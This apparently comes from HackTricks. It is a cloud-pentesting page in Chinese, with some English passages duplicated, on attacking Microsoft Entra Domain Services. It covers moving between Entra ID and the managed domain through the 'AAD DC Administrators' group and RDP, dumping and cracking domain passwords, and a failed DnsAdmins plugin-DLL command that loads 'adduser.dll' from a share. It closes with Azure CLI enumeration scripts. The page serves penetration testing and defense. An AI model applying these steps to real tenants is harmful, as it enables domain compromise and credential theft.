# Az - Microsoft Entra Domain Services

{{#include ../../../banners/hacktricks-training.md}}

## 域服务

Microsoft Entra Domain Services 允许在 Azure 中部署 Active Directory，而无需管理 Domain Controllers（实际上你甚至无法访问它们）。

其主要目的是允许你在云中运行无法使用现代身份验证方法的遗留应用，或在你不希望目录查找总是回到本地 on-premises AD DS 环境时使用。

请注意，为了将 Entra ID 中生成的用户（而非从其他 Active Directory 同步过来的用户）同步到 AD domain service，你需要将该用户的密码**更改为新密码**，以便可以与新的 AD 同步。实际上，用户在更改密码之前不会从 Microsoft Entra ID 同步到 Domain Services。

> [!WARNING]
> 即使你正在创建一个新的 active directory 域，你也无法对其进行完全管理（除非利用某些错误配置），这意味着默认情况下例如你不能直接在 AD 中创建用户。你需要通过 **从 Entra ID 同步用户** 来创建它们。你可以选择同步所有用户（即使是从其他 on-premise AD 同步过来的），仅同步云用户（在 Entra ID 中创建的用户），或者甚至**对它们进行更多筛选**。

> [!NOTE]
> 一般来说，由于对新域配置的灵活性较差且 AD 通常已经存在于本地，这并不是 Entra ID 与 AD 之间的主要集成方式，但了解如何攻陷它仍然很有意义。

### Pivoting

生成的 **`AAD DC Administrators`** 组的成员在加入该托管域的域关联 VM 上被授予本地管理员权限（但不包括 domain controllers），因为他们被添加到了本地 administrators 组。该组的成员还可以使用 **远程桌面 (Remote Desktop) 远程连接到域关联的 VM**，并且也是以下组的成员：

- **`Denied RODC Password Replication Group`**：这是一个指定哪些用户和组的密码不能在 RODCs（Read-Only Domain Controllers）上缓存的组。
- **`Group Policy Creators Owners`**：该组允许成员在域中创建 Group Policies。然而，其成员无法将组策略应用于用户或组，也不能编辑现有的 GPO，所以在此环境中并不是特别有趣。
- **`DnsAdmins`**：该组允许管理 DNS 设置，过去曾被滥用以[提升权限并攻陷域](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmin#dnsadmins)，但在对该环境中的攻击进行测试后，已确认该漏洞已被修补：
```text
dnscmd TDW52Y80ZE26M1K.azure.hacktricks-training.com /config /serverlevelplugindll \\10.1.0.6\c$\Windows\Temp\adduser.dll

DNS Server failed to reset registry property.
Status = 5 (0x00000005)
Command failed:  ERROR_ACCESS_DENIED     5    0x5
```
Note that to grant these permissions, inside the AD the group **`AAD DC Administrators`** group is made a member of the previous groups, and also the GPO **`AADDC Computers GPO`** is adding as Local Administrators all the members of the domain group **`AAD DC Administrators`**.

注意：为赋予这些权限，在 AD 内，组 **`AAD DC Administrators`** 被加入到前述的各个组中；同时 GPO **`AADDC Computers GPO`** 会将域组 **`AAD DC Administrators`** 的所有成员添加为 Local Administrators。

Pivoting from Entra ID to an AD created with Domain Services is straightforward, just add a user into the group **`AAD DC Administrators`**, access via RDP to any/all the machines in the domain and you will be able to steal data and also **compromise the domain.**

Pivoting from Entra ID 到使用 Domain Services 创建的 AD 是很直接的，只需将一个用户加入组 **`AAD DC Administrators`**，通过 RDP 访问域内任意/所有机器，就可以窃取数据并且能够 **compromise the domain.**

However, pivoting from the domain to Entra ID is not as easy as nothing from the domain is being synchronized into Entra ID. However, always checn the metadata to all the VMs joined as their assigned managed identities might have interesting permissions. Also **dump all the users passwords from the domain** and try to crack them to then login into Entra ID / Azure.

然而，从 domain 向 Entra ID 进行 pivoting 并不容易，因为 domain 中的内容并未同步到 Entra ID。不过，始终检查所有已加入的 VMs 的 metadata，因为它们被分配的 managed identities 可能拥有有趣的权限。此外，**dump all the users passwords from the domain** 并尝试 crack 它们，然后登录到 Entra ID / Azure。

> [!NOTE]
> Note that in the past other vulnerabilities in this managed AD were found that allowed to compromise the DCs, [like this one](https://www.secureworks.com/research/azure-active-directory-domain-services-escalation-of-privilege?utm_source=chatgpt.com). An attacker compromising the DC could very easily maintain persistence without the Azure admins noticing or even being able to remove it.
> 
> 需要注意的是，过去在这个 managed AD 中发现过其他漏洞，允许 compromise the DCs，例如 [like this one](https://www.secureworks.com/research/azure-active-directory-domain-services-escalation-of-privilege?utm_source=chatgpt.com)。攻击者一旦 compromise the DC，就很容易保持 persistence，而 Azure admins 可能不会注意到，甚至无法将其移除。

### Enumeration
```bash
# Get configured domain services domains (you can add more subs to check in more subscriptions)
az rest --method post \
--url "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" \
--body '{
"subscriptions": [
"0ce1297c-9153-425d-3229-f51093614377"
],
"query": "resources | where type == \"microsoft.aad/domainservices\"",
"options": {
"$top": 16,
"$skip": 0,
"$skipToken": ""
}
}'

# Get domain configuration
az rest --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/<domain-name>?api-version=2022-12-01&healthdata=true"
## e.g.
az rest --url "https://management.azure.com/subscriptions/0ce1297c-9153-425d-3229-f51093614377/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/azure.hacktricks-training.com?api-version=2022-12-01&healthdata=true"

# Based on the VNet assigned to the domain services, you can enumerate the VMs in the domain

subscription_id="0ce1297c-9153-425d-3229-f51093614377"
vnet_name="aadds-vnet"

# Retrieve all VMs in the subscription
vm_list=$(az vm list --subscription "$subscription_id" --query "[].{Name:name, ResourceGroup:resourceGroup}" --output tsv)

# Iterate through each VM to check their VNet connection
echo "VMs connected to VNet '$vnet_name':"
while IFS=$'\t' read -r vm_name resource_group; do
nic_ids=$(az vm show --subscription "$subscription_id" --name "$vm_name" --resource-group "$resource_group" --query "networkProfile.networkInterfaces[].id" --output tsv)

for nic_id in $nic_ids; do
subnet_id=$(az network nic show --ids "$nic_id" --query "ipConfigurations[0].subnet.id" --output tsv)

if [[ $subnet_id == *"virtualNetworks/$vnet_name"* ]]; then
echo "VM Name: $vm_name, Resource Group: $resource_group"
fi
done
done <<< "$vm_list"
```
{{#include ../../../banners/hacktricks-training.md}}
